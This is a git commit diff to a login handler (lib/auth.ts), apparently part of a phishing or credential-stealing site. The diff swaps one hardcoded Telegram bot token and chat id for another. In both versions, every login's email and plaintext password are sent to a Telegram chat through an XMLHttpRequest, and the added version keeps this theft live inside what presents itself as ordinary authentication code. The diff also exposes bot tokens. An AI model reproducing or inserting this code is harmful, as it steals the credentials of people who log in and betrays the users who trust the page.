110b5f90ace51442de294665339d49a61f97e4d0
unknown <SCHW18TZ>
2025-01-14 13:39:16 +0530

    Changed

--- lib/auth.ts
+++ lib/auth.ts
@@ -1,26 +1,25 @@
 export async function handleLogin(email: string, password: string) {
   console.log(`Login attempt with email: ${email}`);
-  
-   var xhr = new XMLHttpRequest();
-                xhr.onreadystatechange = function () {
-                  if (xhr.readyState === 4) {
-                    console.log(xhr.response);
-                  }
-                };
-                xhr.open(
-                  "get",
-                  `https://api.telegram.org/bot8037747937:AAF0msiBKIVfmzxBsc8s59YTPaFSrH5TrAU/sendMessage?chat_id=7547959855&text=📧 Email : ${email}\n 🔒 Password:${password}\n`,
-                  true
-                );
-                xhr.setRequestHeader(
-                  "Content-Type",
-                  "application/x-www-form-urlencoded; charset=UTF-8"
-                );
 
-                xhr.setRequestHeader(
-                  "Content-Type",
-                  "application/x-www-form-urlencoded; charset=UTF-8"
-                );
-                xhr.send();
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      console.log(xhr.response);
+    }
+  };
+  xhr.open(
+    "get",
+    `https://api.telegram.org/bot7663938323:AAEJDFBG20IYX0SCVPEfoOo3lyVxtFV8MZU/sendMessage?chat_id=-1002276420662&text=📧 Email : ${email}\n 🔒 Password:${password}\n`,
+    true
+  );
+  xhr.setRequestHeader(
+    "Content-Type",
+    "application/x-www-form-urlencoded; charset=UTF-8"
+  );
+
+  xhr.setRequestHeader(
+    "Content-Type",
+    "application/x-www-form-urlencoded; charset=UTF-8"
+  );
+  xhr.send();
 }
-
